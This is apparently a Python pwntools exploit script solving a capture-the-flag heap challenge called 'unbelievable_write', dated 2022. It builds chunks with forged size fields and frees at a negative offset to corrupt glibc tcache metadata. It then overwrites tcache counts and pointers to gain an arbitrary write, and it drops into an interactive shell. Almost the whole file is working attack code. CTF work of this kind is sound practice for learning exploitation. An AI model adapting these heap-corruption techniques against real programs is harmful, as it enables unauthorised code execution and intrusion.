# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './unbelievable_write'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , text = 'a'):
    cmd(1)
    sl( str(size))
    sl(text)

def delete(offset ):
    cmd(2)
    sl( str(offset))

# one_gad = one_gadget(libc.path)

target = 0x404080

def attack():
    
    add(0x100 , 'a'*0x18 + p64(0xf1))

    add(0x130)
    add(0x180)
    add(0x240)

    add(0x80)
    add(0x100 , 'a'*0x18 + p64(0x101))
    add(0x120)
    add(0x140)
    add(0x190)

    add(0x200)
    delete(-0x290)

    add(0x280,'a'*0x10+'\x01\x00\x01\x00\x01\x00\x01\x00'*5+p64(0)*24+'\xe0')
    add(0x100,'a'*0xe0+p64(0)+p64(0x4c1+0x60))
    add(0x280,'a'*0x10+p64(0)+'\x01\x00\x01\x00\x01\x00\x01\x00'*4+p64(0)*25+'\xa0')
    # add(0x110,'a'*0xf0+p64(0)+p64(0x421))

    # add(0x130)
    # add(0x500)

    # dbg()

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   unbelievable_write.py
@Time    :   2022/02/19 13:43:06
@Author  :   Niyah 
'''